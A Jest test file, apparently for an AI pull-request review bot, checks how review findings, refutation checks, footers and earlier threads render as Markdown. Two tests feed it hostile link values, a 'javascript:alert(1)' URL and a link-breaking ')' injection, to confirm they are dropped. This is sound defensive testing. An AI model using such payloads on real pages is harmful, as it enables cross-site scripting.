    expect(render({ ...ruleWarning, pairRefutation: backed })).toContain('**Doubt found**\nManki found a reason this may not happen, but a disproof alone');
    expect(render({ ...baseFinding, refutation: { outcome: 'unsettled', reason: 'The caller is generated.', files: ['src/main.ts'], codeDigest: 'abc' } }))
      .toContain('\n<!-- manki-checks -->\n**Not settled:** Manki tried to disprove this by reading the code and could not decide. The caller is generated.\n');

    // A second refuter on another model gets a line of its own, so a split shows both reasons.
    const splitFinding: Finding = {
      ...baseFinding, evidence: { checks: [], proof: [] },
      refutation: { outcome: 'confirmed', reason: 'No caller checks `value` first.', proof: ['src/main.ts:42'], files: ['src/main.ts'], codeDigest: 'abc' },
      pairRefutation: { outcome: 'disproved', reason: 'The parser rejects it.', proof: ['src/util.ts:3'], files: ['src/main.ts', 'src/util.ts'], codeDigest: 'def' },
    };
    const split = render(splitFinding);
    expect(split).toContain('<summary>How this was checked: double-checked, second check: doubt found</summary>');

    // A finding with a check status names that in the title of its fold, in place of what each refuter found.
    expect(render({ ...splitFinding, checkStatus: 'unconfirmed' })).toContain('<summary>How this was checked: not confirmed</summary>');
    const cited = { checks: ['src/util.ts:3 marks it intended'], proof: ['src/util.ts:3'] };
    expect(render({ ...baseFinding, evidence: cited, refutation: splitFinding.refutation, checkStatus: 'confirmed' })).toContain('<summary>How this was checked: 1 place read, confirmed with tools</summary>');
    expect(render({ ...baseFinding, evidence: cited, howToFix: 'Check for `null` first.', checkStatus: 'proven' })).toContain('<summary>How to fix it and 1 place read · proven from the cited lines</summary>');
    expect(render({ ...baseFinding, howToFix: 'Check for `null` first.', checkStatus: 'unconfirmed' })).toContain('<summary>How to fix it · not confirmed</summary>');
    // The status takes the place of "not checked against the code" in the title, so the fold says it.
    expect(render({ ...baseFinding, checkStatus: 'unconfirmed' })).toContain('<summary>How this was checked: not confirmed</summary>\n\n**Not checked against the code**\nNothing was cited to back it.\n');
    // A single line folds all the same, so the title can say it.
    const oneLine = { checks: [], proof: ['src/main.ts:42'] };
    expect(render({ ...baseFinding, evidence: oneLine })).toContain('\n<!-- manki-checks -->\n**Checked:** ');
    expect(render({ ...baseFinding, evidence: oneLine, checkStatus: 'proven' })).toMatch(/\n<!-- manki-checks -->\n<details>\n<summary>How this was checked: 1 place read, proven from the cited lines<\/summary>\n\n- \[`src\/main\.ts:42`\]/);
    expect(split).toContain(`**Double-checked**\nManki tried to disprove this by reading the code and could not. No caller checks \`value\` first.\n\n**Second check, on another model**\nDoubt found. The parser rejects it. See [\`src/util.ts:3\`](${link('src/util.ts', 3)}).`);

    // A blocker of the judge's that two disproofs put back at its finders' grade says that it does not block.
    const lowered = render({
      ...baseFinding, severity: 'warning', evidence: { checks: [], proof: [] },
      gradePath: [{ from: 'warning', to: 'blocker', by: 'judge' }, { from: 'blocker', to: 'warning', by: 'refutation' }],
      refutation: { outcome: 'disproved', reason: 'A `sync.Once` guards the close.', proof: ['src/main.ts:40'], files: ['src/main.ts'], codeDigest: 'abc' },
      pairRefutation: { outcome: 'disproved', reason: 'Both paths close through one guard.', proof: ['src/main.ts:40'], files: ['src/main.ts'], codeDigest: 'abc' },
    });
    expect(lowered).toContain('**Doubt found**\nManki found a reason this may not happen, and a second check on another model agreed, so this does not block. Please check it yourself. A `sync.Once` guards the close.');
    expect(lowered).toContain('**Second check, on another model**\nDoubt found. Both paths close through one guard.');
  });

  it('keeps the code spans of every check line balanced, so no line breaks the Markdown after it', () => {
    // Each line as Markdown reads it: a backtick run closes only on a run of the same length, and `\`` is text.
    const pairs = (line: string): boolean => {
      let open: number | undefined;
      for (const run of line.replace(/\\`/g, '').match(/`+/g) ?? []) {
        if (open === undefined) open = run.length;
        else if (run.length === open) open = undefined;
      }
      return open === undefined;
    };
    const checks = [
      '`src/github.ts:1153`: `agreedFollowUps` builds a Finding from `t.description`, which is empty for a thread posted without one',
      '`src/recap.test.ts:2141` calls `formatFindingComment` with `judgeConfidence: \'low\'` and no `evidence`',
      'Appends each section with `comment += `\\n\\n${section}``, so with no fix it directly follows the description',
      'Calls `run( and stops',
    ];
    const tokens = new Set(['src/github.ts', 'agreedFollowUps', 't.description', 'formatFindingComment']);
    const comment = highlightCode(render({ ...baseFinding, evidence: { checks, proof: [] } }), tokens);

    expect(comment.split('\n').filter(line => !pairs(line))).toEqual([]);
    // A location in backticks leaves none behind, whether the path and line share the span or not.
    expect(comment).toContain(`\`agreedFollowUps\` builds a Finding from \`t.description\`, which is empty for a thread posted without one\n${links.linkTo('src/github.ts', 1152, 1153)}`);
    expect(comment).toContain(`Calls \`formatFindingComment\` with \`judgeConfidence: 'low'\` and no \`evidence\`\n${links.linkTo('src/recap.test.ts', 2140, 2141)}`);
    // Quoted code that holds a backtick gets a longer run, and a line that cannot be paired shows its backticks as text.
    expect(comment).toContain('- Appends each section with `` comment += `\\n\\n${section}` ``, so with no fix it directly follows the description');
    expect(comment).toContain('- Calls \\`run( and stops');
    expect(render({ ...baseFinding, evidence: { checks: ['`src/a.ts`:3 reads `x`'], proof: [] } })).toContain(`Reads \`x\`\n${links.linkTo('src/a.ts', 2, 3)}`);

    // An escaped backtick stays text, also for highlighting, so a later code span on the same line keeps its own pair.
    const joined = highlightCode(render({ ...baseFinding, evidence: { checks: ['src/main.ts:42 calls `run( and stops', 'src/main.ts:42 reads `src/a.ts` later'], proof: [] } }), new Set(['src/a.ts']));
    expect(joined).toContain('On the commented line: Calls \\`run( and stops Reads `src/a.ts` later');
    // A closing run closes whole opening runs only, so nothing is cut from the code, and escaped runs count as text.
    const odd = render({ ...baseFinding, evidence: { checks: ['Reads ``foo` and bar` here', 'Reads ```x and `y z`'], proof: [] } });
    expect(odd).toContain('- Reads \\`\\`foo\\` and bar\\` here\n- Reads \\`\\`\\`x and `y z`');
    expect(odd.split('\n').filter(line => !pairs(line))).toEqual([]);

    // A cut inside a code span closes it after the ellipsis, so the rest of the line keeps its spans and gets no backticks inside them.
    const reason = 'The overrides of `Vec<T>::consensus_decode` and `Vec<u8>::consensus_decode` now call the finite-reader decode on the caller\'s reader. They drop the `take(MAX_VEC_SIZE)` the default wrapped them in.';
    const longCheck = 'src/util.ts:20 The new test `streaming_read_has_no_budget_below_the_core_range` shows 8 MB being read through `Vec::<Vec<u8>>::consensus_decode`, where the old `limit_read_test` failed';
    const cut = highlightCode(render({
      ...baseFinding,
      evidence: { checks: [longCheck, `${'a'.repeat(156)} \`xyz_long\` is past the cut`, `${'a'.repeat(150)} \`xxxxx\`\` y\` and more words here`], proof: [] },
      refutation: { outcome: 'confirmed', reason, files: [], codeDigest: 'abc' },
    }), new Set(['consensus_decode', 'streaming_read_has_no_budget_below_the_core_range']));
    expect(cut).toContain('could not. The overrides of `Vec<T>::consensus_decode` and `Vec<u8>::consensus_decode` now call the finite-reader decode on the caller\'s reader. They drop the `take(MAX_…`\n');
    expect(cut).toContain('The new test `streaming_read_has_no_budget_below_the_core_range` shows 8 MB being read through `Vec::<Vec<u8>>::consensus_decode`, where the old `limit_read_t…`\n');
    // A span with none of its code before the cut is left out.
    expect(cut).toContain(`- A${'a'.repeat(155)}…\n`);
    // A longer run inside the span that the cut splits is dropped, so what is left of it cannot close the span early.
    expect(cut).toContain(`- A${'a'.repeat(149)} \`xxxxx…\`\n`);
    expect(cut).not.toContain('\\`');
    expect(cut.split('\n').filter(line => !pairs(line))).toEqual([]);
  });

  it('omits the fix when there is none', () => {
    const comment = render(baseFinding);
    expect(comment).not.toContain('<summary>Suggested fix</summary>');
    expect(comment).not.toContain('```');
  });

  it('ends every finding with a box that files it as an issue, security and verdict reader ones included', () => {
    const box = /\n\n<!-- manki-issue-box -->\n- \[ \] Create an issue for this <!-- manki-box:issue:src\/main\.ts:42:d32251b30965 -->\n\n<!-- manki:blocker:/;
    expect(render(baseFinding)).toMatch(box);
    // The review already shows a security finding, so a box on it discloses nothing more.
    expect(render({ ...baseFinding, tags: ['security'], category: 'security' })).toMatch(box);
    expect(render({ ...baseFinding, reviewers: ['Verdict reader'] })).toMatch(box);
    // A file name that would end the hidden comment is encoded in the id.
    expect(render({ ...baseFinding, file: 'src/a-->b.ts' })).toContain('<!-- manki-box:issue:src/a--%3Eb.ts:42:d32251b30965 -->');
  });

  it('keeps the finding data in a hidden comment, never in visible text', () => {
    const finding: Finding = {
      ...baseFinding,
      severity: 'note',
      reviewers: ['Security', 'Testing'],
      suggestedFix: 'a'.repeat(250),
      howToFix: 'b'.repeat(301),
      tags: ['own-proposal-followup'],
      originalSeverity: 'blocker',
    };
    const comment = render(finding);
    expect(comment).not.toMatch(/AI context|<sub>|capped from|Flagged by/);
    expect(findingData(comment)).toEqual({
      file: 'src/main.ts',
      line: 42,
      severity: 'note',
      flaggedBy: ['Security', 'Testing'],
      title: 'Null pointer dereference',
      // A cut fix ends in an ellipsis, so a follow-up that shows it never passes a cut sentence off as the whole fix.
      fix: `${'a'.repeat(200)}...`,
      howToFix: `${'b'.repeat(300)}...`,
      tags: ['own-proposal-followup'],
      originalSeverity: 'blocker',
    });
    expect(findingData(render(baseFinding))).toEqual({
      file: 'src/main.ts', line: 42, severity: 'blocker', flaggedBy: ['Security & Correctness'], title: 'Null pointer dereference',
    });
  });

  it('escapes a comment terminator in the hidden finding data', () => {
    const comment = render({ ...baseFinding, title: 'Bug: x --> y' });
    expect(comment).toContain('<!-- manki:blocker:Bug--x-----y -->');
    expect(findingData(comment).title).toBe('Bug: x --> y');
  });
});

describe('mapVerdictToEvent', () => {
  it('maps APPROVE to APPROVE', () => {
    expect(mapVerdictToEvent('APPROVE')).toBe('APPROVE');
  });

  it('maps COMMENT to COMMENT', () => {
    expect(mapVerdictToEvent('COMMENT')).toBe('COMMENT');
  });

  it('maps REQUEST_CHANGES to REQUEST_CHANGES', () => {
    expect(mapVerdictToEvent('REQUEST_CHANGES')).toBe('REQUEST_CHANGES');
  });
});

const TRAILING_MARKERS = `\n\n${BOT_MARKER}\n${VERSION_MARKER_PREFIX} ${MANKI_VERSION} -->`;

describe('BOT_MARKER', () => {
  it('is an HTML comment', () => {
    expect(BOT_MARKER).toMatch(/^<!--.*-->$/);
  });

  it('matches legacy unversioned comments (backwards compat)', () => {
    const legacyBody = `${BOT_MARKER}\n**Review started**`;
    expect(legacyBody.includes(BOT_MARKER)).toBe(true);
    expect(extractVersionFromBody(legacyBody)).toBeNull();
  });

  it('matches new comments with both markers', () => {
    const newBody = `${BOT_MARKER}\n${VERSION_MARKER_PREFIX} ${MANKI_VERSION} -->\n**Review started**`;
    expect(newBody.includes(BOT_MARKER)).toBe(true);
    expect(extractVersionFromBody(newBody)).toBe(MANKI_VERSION);
  });

  it('parses version from a comment containing the version marker', () => {
    expect(extractVersionFromBody('<!-- manki-bot -->\n<!-- manki-version: 4.2.0 -->\nfoo')).toBe('4.2.0');
    expect(extractVersionFromBody('<!-- manki-version:9.9.9 -->')).toBe('9.9.9');
    expect(extractVersionFromBody('no marker here')).toBeNull();
    expect(extractVersionFromBody(null)).toBeNull();
  });

  it('MANKI_VERSION is a non-empty string resembling semver', () => {
    expect(typeof MANKI_VERSION).toBe('string');
    expect(MANKI_VERSION.length).toBeGreaterThan(0);
    expect(MANKI_VERSION).toMatch(/^(\d+\.\d+\.\d+|unknown)/);
  });
});

describe('postReview generalFindings', () => {
  const mockCreateReview = jest.fn().mockResolvedValue({ data: { id: 1 } });
  const mockOctokit = {
    rest: {
      pulls: {
        createReview: mockCreateReview,
      },
    },
  } as unknown as Parameters<typeof postReview>[0];

  beforeEach(() => {
    mockCreateReview.mockClear();
  });

  it('includes suggestedFix in general findings when finding has no file', async () => {
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [
        {
          severity: 'warning',
          title: 'Add error handling',
          file: '',
          line: 0,
          description: 'Missing try/catch.',
          suggestedFix: 'try { op(); } catch (e) { handle(e); }',
          reviewers: ['Correctness'],
        },
      ],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const call = mockCreateReview.mock.calls[0][0];
    expect(call.event).toBe('APPROVE');
    expect(call.body).toContain('<summary>How to fix it · not checked against the code</summary>\n\n**How to fix it**\n```\ntry { op(); } catch (e) { handle(e); }\n```');
  });

  it('omits the suggested fix when finding has no suggestedFix', async () => {
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [
        {
          severity: 'warning',
          title: 'Add error handling',
          file: '',
          line: 0,
          description: 'Missing try/catch.',
          reviewers: ['Correctness'],
        },
      ],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const call = mockCreateReview.mock.calls[0][0];
    expect(call.event).toBe('APPROVE');
    expect(call.body).not.toContain('Suggested fix');
  });

  it('truncates long suggestedFix to 600 chars in general findings', async () => {
    const longFix = 'x'.repeat(700);
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [
        {
          severity: 'warning',
          title: 'Long fix',
          file: '',
          line: 0,
          description: 'Desc.',
          suggestedFix: longFix,
          reviewers: [],
        },
      ],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('x'.repeat(597) + '...');
    expect(body).not.toContain('x'.repeat(601));
  });

  it('shows a one-line suggestedFix with backticks as is in a fenced block', async () => {
    const fixWithBackticks = 'use `foo` instead of `bar`';
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [
        {
          severity: 'warning',
          title: 'Backtick fix',
          file: '',
          line: 0,
          description: 'Desc.',
          suggestedFix: fixWithBackticks,
          reviewers: [],
        },
      ],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('<summary>How to fix it</summary>\n\n```\nuse `foo` instead of `bar`\n```');
  });

  it('uses longer fence when suggestedFix contains triple backticks', async () => {
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [
        {
          severity: 'warning',
          title: 'Fence break',
          file: '',
          line: 0,
          description: 'Desc.',
          suggestedFix: 'some ```code``` here',
          reviewers: [],
        },
      ],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('````');
    expect(body).toContain('some ```code``` here');
  });

  it('includes description in general findings', async () => {
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [
        {
          severity: 'warning',
          title: 'Some title',
          file: '',
          line: 0,
          description: 'Important description here.',
          reviewers: [],
        },
      ],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('Important description here.');
  });

  it('truncates review body when it exceeds max length', async () => {
    const longDesc = 'x'.repeat(70000);
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: longDesc,
      findings: [],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body.length).toBeLessThanOrEqual(60000 + 600); // cap + truncation notice + footer appended after truncation
    expect(body).toContain('*(Review body truncated)*');
  });

  it('includes file path in general findings when file is set but line is invalid', async () => {
    const result: ReviewResult = {
      verdict: 'APPROVE',
      summary: 'Summary',
      findings: [
        {
          severity: 'warning',
          title: 'Some title',
          file: 'src/utils.ts',
          line: 0,
          description: 'Desc.',
          reviewers: [],
        },
      ],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'owner', 'repo', 1, 'sha', result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('`src/utils.ts`');
  });
});

describe('postReview reviewed-commit footer', () => {
  const mockCreateReview = jest.fn().mockResolvedValue({ data: { id: 1 } });
  const mockOctokit = {
    rest: {
      pulls: {
        createReview: mockCreateReview,
      },
    },
  } as unknown as Parameters<typeof postReview>[0];

  const fullSha = 'ede627f1234567890abcdef0123456789abcdef0';
  const shortSha = fullSha.slice(0, 7);
  const expectedFooter = aboutFold(`[\`${shortSha}\`](https://github.com/acme/widgets/commit/${fullSha})`);
  const expectedEnd = `${expectedFooter}${TRAILING_MARKERS}`;

  beforeEach(() => {
    mockCreateReview.mockClear();
  });

  function buildResult(verdict: ReviewResult['verdict']): ReviewResult {
    return {
      verdict,
      summary: 'Summary text.',
      findings: [],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };
  }

  it.each(['APPROVE', 'COMMENT', 'REQUEST_CHANGES'] as const)(
    'ends the review body with the reviewed-commit footer for verdict %s',
    async verdict => {
      await postReview(mockOctokit, 'acme', 'widgets', 1, fullSha, buildResult(verdict));
      const body = mockCreateReview.mock.calls[0][0].body as string;
      expect(body.endsWith(expectedEnd)).toBe(true);
    },
  );

  it('renders the footer as a markdown link to the commit URL with a 7-char short SHA', async () => {
    await postReview(mockOctokit, 'acme', 'widgets', 1, fullSha, buildResult('APPROVE'));
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain(expectedFooter);
    expect(shortSha).toBe(fullSha.slice(0, 7));
    expect(body).toMatch(/- Reviewed \[`[0-9a-f]{7}`\]\(https:\/\/github\.com\/acme\/widgets\/commit\/[0-9a-f]+\)\n[^\n]*\n\n<\/details>\n\n<!-- manki-bot -->/);
  });

  it('uses a custom serverUrl for GHE and strips trailing slashes', async () => {
    const gheServerUrl = 'https://github.example.com/';
    const gheShortSha = fullSha.slice(0, 7);
    const expectedGheFooter = `- Reviewed [\`${gheShortSha}\`](https://github.example.com/acme/widgets/commit/${fullSha})`;
    // eslint-disable-next-line @typescript-eslint/no-require-imports
    const ghCtx = require('@actions/github').context;
    const originalServerUrl = ghCtx.serverUrl;
    Object.defineProperty(ghCtx, 'serverUrl', { value: gheServerUrl, configurable: true, writable: true });
    try {
      await postReview(mockOctokit, 'acme', 'widgets', 1, fullSha, buildResult('APPROVE'));
      const body = mockCreateReview.mock.calls[0][0].body as string;
      expect(body).toContain(expectedGheFooter);
      expect(body).not.toContain('//acme');
    } finally {
      Object.defineProperty(ghCtx, 'serverUrl', { value: originalServerUrl, configurable: true, writable: true });
    }
  });

  it('keeps the footer at the bottom even when the line-error fallback appends extra sections', async () => {
    const createReviewMock = jest.fn()
      .mockRejectedValueOnce(new Error('pull_request_review_thread.line must be part of the diff'))
      .mockResolvedValueOnce({ data: { id: 9 } });
    const octokit = {
      rest: { pulls: { createReview: createReviewMock } },
    } as unknown as Parameters<typeof postReview>[0];

    const result: ReviewResult = {
      verdict: 'REQUEST_CHANGES',
      outcome: 'ADDRESS_FIRST',
      summary: 'Summary.',
      findings: [{
        severity: 'blocker',
        title: 'Issue',
        file: 'src/a.ts',
        line: 10,
        description: 'Desc.',
        reviewers: [],
      }],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(octokit, 'acme', 'widgets', 1, fullSha, result);
    const fallbackBody = createReviewMock.mock.calls[1][0].body as string;
    expect(fallbackBody.endsWith(expectedEnd)).toBe(true);
    expect(fallbackBody).toContain('**Inline comments could not be posted:**\n- \u{1F6AB} **Blocker** **Issue**');
    // A thread is only counted in the body, so the comment GitHub refused is listed only as not posted.
    expect(createReviewMock.mock.calls[0][0].body).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 blocker\.\n\n\*\*What blocks:\*\*/u);
    expect(fallbackBody).not.toContain('[Issue]');
  });

  it('keeps the footer at the bottom when APPROVE falls back to COMMENT due to permissions', async () => {
    const createReviewMock = jest.fn()
      .mockRejectedValueOnce(Object.assign(new Error('GitHub Actions is not permitted to approve pull requests.'), { status: 422 }))
      .mockResolvedValueOnce({ data: { id: 10 } });
    const octokit = {
      rest: { pulls: { createReview: createReviewMock } },
    } as unknown as Parameters<typeof postReview>[0];

    const result: ReviewResult = {
      verdict: 'APPROVE',
      outcome: 'READY',
      summary: 'All good.',
      findings: [{
        severity: 'warning',
        title: 'Minor',
        file: 'src/a.ts',
        line: 10,
        description: 'Desc.',
        reviewers: [],
        tags: ['follow-up'],
      }],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    const diff: ParsedDiff = {
      files: [{ path: 'src/a.ts', changeType: 'modified', hunks: [{ oldStart: 10, oldLines: 1, newStart: 10, newLines: 1, content: '' }] }],
      totalAdditions: 1,
      totalDeletions: 0,
    };

    await postReview(octokit, 'acme', 'widgets', 1, fullSha, result, diff);
    const fallbackBody = createReviewMock.mock.calls[1][0].body as string;
    // The review GitHub took as a comment has no line comments, so it lists the finding as not posted inline.
    expect(createReviewMock.mock.calls[0][0].body).toMatch(/^\u2705 \*\*Approved\.\*\* 1 warning, which doesn't block\.\n\n\*\*Summary:\*\*/u);
    expect(fallbackBody).not.toContain('[Minor]');
    expect(fallbackBody.endsWith(expectedEnd)).toBe(true);
    expect(fallbackBody).toContain('**Findings (could not post inline):**\n- \u26A0\uFE0F **Warning, not blocking** **Minor** (`src/a.ts:10`)');
  });

  it('preserves the footer even when the review body exceeds the truncation limit', async () => {
    const hugeSummary = 'x'.repeat(65000);
    const result: ReviewResult = {
      verdict: 'COMMENT',
      summary: hugeSummary,
      findings: [],
      highlights: [],
      reviewComplete: true,
      agentNames: [],
    };

    await postReview(mockOctokit, 'acme', 'widgets', 1, fullSha, result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body.endsWith(expectedEnd)).toBe(true);
    expect(body.length).toBeLessThanOrEqual(60000 + expectedEnd.length + 4);
  });
});

function makeContext(overrides: Partial<RoundContext> = {}): RoundContext {
  const base: RoundContext = {
    meta: {
      prNumber: 42,
      commitSha: 'abc123',
      round: 1,
      timestamp: '2026-01-01T00:00:00.000Z',
      mankiVersion: '4.7.0',
    },
    config: { reviewLevel: 'medium', memoryEnabled: false },
    diff: { lines: 120, additions: 80, deletions: 40, filesReviewed: 5, fileTypes: { '.ts': 5 } },
    models: { reviewer: 'claude-sonnet-4-20250514', judge: 'claude-opus-4-20250514' },
    planner: { source: 'disabled', used: false },
    reviewers: { agents: ['Security & Safety', 'Correctness'] },
    judge: { summary: 'All checks done.' },
    dedup: {},
    memory: {},
    findings: { count: 4, severityCounts: { blocker: 1, warning: 0, note: 3 }, entries: [] },
    usage: {},
    verdict: 'REQUEST_CHANGES',
  };
  return { ...base, ...overrides };
}

describe('formatBlockingPriorThreads', () => {
  const makeResult = (overrides: Partial<ReviewResult> = {}): ReviewResult => ({
    verdict: 'REQUEST_CHANGES',
    verdictReason: 'prior_unaddressed',
    summary: 'Prior concerns still open.',
    findings: [],
    highlights: [],
    reviewComplete: true,
    agentNames: [],
    ...overrides,
  });

  it('lists the priors when a new blocker decided the outcome', () => {
    const result = makeResult({
      verdictReason: 'required_present',
      verdictTrace: {
        survivingBlockers: [{ file: 'b.ts', title: 'y', fingerprint: 'b.ts:2:2:y' }],
        unresolvedPriors: [{ file: 'a.ts', title: 'x', fingerprint: 'a.ts:1:1:x', line: 1 }],
      },
    });
    expect(formatBlockingPriorThreads(result)).toBe('**Still open from earlier reviews:**\n- `a.ts:1`: x');
  });

  it('returns null when there are no unresolved priors on the trace', () => {
    const result = makeResult({
      verdictTrace: { survivingBlockers: [], unresolvedPriors: [] },
    });
    expect(formatBlockingPriorThreads(result)).toBeNull();
  });

  it('leaves out the priors that "Needs a human" already lists', () => {
    const listed = { file: 'a.ts', title: 'A', fingerprint: 'a.ts:1:1:a', line: 1 };
    const other = { file: 'b.ts', title: 'B', fingerprint: 'b.ts:2:2:b', line: 2 };
    const trace = { survivingBlockers: [], unresolvedPriors: [listed, other] };
    const paused = (unresolvedPriors: typeof trace.unresolvedPriors) => makeResult({
      outcome: 'NOT_CONVERGING', verdictTrace: { ...trace, unresolvedPriors }, needsHuman: { cause: 'budget', blockers: [listed] },
    });
    expect(formatBlockingPriorThreads(paused([listed, other]))).toBe('**Still open from earlier reviews:**\n- `b.ts:2`: B');
    expect(formatBlockingPriorThreads(paused([listed]))).toBeNull();
    // Outside a pause "Needs a human" is not rendered, so every prior is listed.
    expect(formatBlockingPriorThreads(makeResult({ outcome: 'ADDRESS_FIRST', verdictTrace: trace, needsHuman: { cause: 'budget', blockers: [listed] } })))
      .toBe('**Still open from earlier reviews:**\n- `a.ts:1`: A\n- `b.ts:2`: B');
  });

  it('renders the location, title and a thread link when present', () => {
    const result = makeResult({
      verdictTrace: {
        survivingBlockers: [],
        unresolvedPriors: [
          {
            file: 'src/handler.ts',
            title: 'Stdout-tail sanitization test passes trivially',
            fingerprint: 'src/handler.ts:42:42:stdout-tail',
            threadId: 'PRRT_xyz',
            severity: 'warning',
            line: 42,
            threadUrl: 'https://github.com/o/r/pull/805#discussion_r1',
          },
        ],
      },
    });
    expect(formatBlockingPriorThreads(result)).toBe(
      '**Still open from earlier reviews:**\n'
      + '- `src/handler.ts:42`: Stdout-tail sanitization test passes trivially ([view thread](https://github.com/o/r/pull/805#discussion_r1))',
    );
  });

  it('lists the open threads that block, a partly fixed one by the grade what remains earns', () => {
    const thread = (title: string, severity: 'blocker' | 'warning' | 'unknown', recordedGrade?: 'blocker' | 'warning') => ({
      title, file: 'a.ts', line: 1, severity, status: 'open' as const, ...(recordedGrade && { recordedGrade }),
    });
    expect(formatOpenBlockers([thread('Blocker', 'blocker'), thread('No marker', 'unknown'), thread('Warning', 'warning'), thread('Partly fixed', 'blocker', 'warning'), thread('Still blocking', 'blocker', 'blocker')]))
      .toBe('**Still open from earlier reviews:**\n- `a.ts:1`: Blocker\n- `a.ts:1`: No marker\n- `a.ts:1`: Still blocking');
    expect(formatOpenBlockers([thread('Partly fixed', 'blocker', 'warning')])).toBeNull();
  });

  it('renders multiple blocking threads', () => {
    const result = makeResult({
      verdictTrace: {
        survivingBlockers: [],
        unresolvedPriors: [
          { file: 'a.ts', title: 'A', fingerprint: 'a.ts:1:1:a', severity: 'blocker', line: 1 },
          { file: 'b.ts', title: 'B', fingerprint: 'b.ts:2:2:b', severity: 'warning', line: 2 },
          { file: 'c.ts', title: 'C', fingerprint: 'c.ts:0:0:c', severity: 'blocker', line: 0 },
        ],
      },
    });
    expect(formatBlockingPriorThreads(result)).toBe('**Still open from earlier reviews:**\n- `a.ts:1`: A\n- `b.ts:2`: B\n- `c.ts`: C');
  });

  it('omits the link when no `threadUrl` is provided', () => {
    const result = makeResult({
      verdictTrace: {
        survivingBlockers: [],
        unresolvedPriors: [
          { file: 'a.ts', title: 'A', fingerprint: 'a.ts:1:1:a', severity: 'warning', line: 1 },
        ],
      },
    });
    const rendered = formatBlockingPriorThreads(result);
    expect(rendered).not.toContain('[view thread](');
  });

  it('omits the link when `threadUrl` contains a `)` that would break the markdown link', () => {
    const result = makeResult({
      verdictTrace: {
        survivingBlockers: [],
        unresolvedPriors: [
          { file: 'a.ts', title: 'A', fingerprint: 'a.ts:1:1:a', severity: 'warning', line: 1, threadUrl: 'https://example.com/path)injected' },
        ],
      },
    });
    const rendered = formatBlockingPriorThreads(result);
    expect(rendered).not.toContain('[view thread](');
  });

  it('omits the link when `threadUrl` uses a non-http scheme', () => {
    const result = makeResult({
      verdictTrace: {
        survivingBlockers: [],
        unresolvedPriors: [
          { file: 'a.ts', title: 'A', fingerprint: 'a.ts:1:1:a', severity: 'warning', line: 1, threadUrl: 'javascript:alert(1)' },
        ],
      },
    });
    const rendered = formatBlockingPriorThreads(result);
    expect(rendered).not.toContain('[view thread](');
  });

  it('is included in the `postReview` body when verdict reason is `prior_unaddressed`', async () => {
    const mockCreateReview = jest.fn().mockResolvedValue({ data: { id: 1 } });
    const mockOctokit = {
      rest: { pulls: { createReview: mockCreateReview } },
    } as unknown as Parameters<typeof postReview>[0];

    const result = makeResult({
      summary: 'Nothing blocking and prior concerns appear addressed.',
      verdictTrace: {
        survivingBlockers: [],
        unresolvedPriors: [
          {
            file: 'src/handler.ts',
            title: 'Stdout-tail sanitization test passes trivially',
            fingerprint: 'src/handler.ts:42:42:stdout-tail',
            threadId: 'PRRT_xyz',
            severity: 'warning',
            line: 42,
            threadUrl: 'https://github.com/o/r/pull/805#discussion_r1',
          },
        ],
      },
    });

    await postReview(mockOctokit, 'o', 'r', 805, 'sha', result);
    const body = mockCreateReview.mock.calls[0][0].body as string;
    expect(body).toContain('Still open from earlier reviews');
    expect(body).toContain('Stdout-tail sanitization test passes trivially');
    expect(body).toContain('https://github.com/o/r/pull/805#discussion_r1');
  });
});

describe('formatStatsOneLiner', () => {
  it('formats a hidden one-liner with severity breakdown', () => {
    const result = formatStatsOneLiner(makeContext(), 45000);
    expect(result).toBe('<!-- manki-stats: 4 findings (1 blocker, 3 notes), 120 lines, 45s -->');
  });

  it('uses the singular for a count of one', () => {
    const ctx = makeContext({
      findings: { count: 1, severityCounts: { blocker: 0, warning: 1, note: 0 }, entries: [] },
      diff: { ...makeContext().diff, lines: 1 },
    });
    expect(formatStatsOneLiner(ctx, 45000)).toBe('<!-- manki-stats: 1 finding (1 warning), 1 line, 45s -->');
  });

  it('omits zero-count severities', () => {
    const ctx = makeContext({
      findings: { count: 3, severityCounts: { blocker: 0, warning: 0, note: 3 }, entries: [] },
    });
    const result = formatStatsOneLiner(ctx, 45000);
    expect(result).toContain('(3 notes)');
    expect(result).not.toContain('blocker');
  });

  it('shows none when all severities are zero', () => {
    const ctx = makeContext({
      findings: { count: 0, severityCounts: { blocker: 0, warning: 0, note: 0 }, entries: [] },
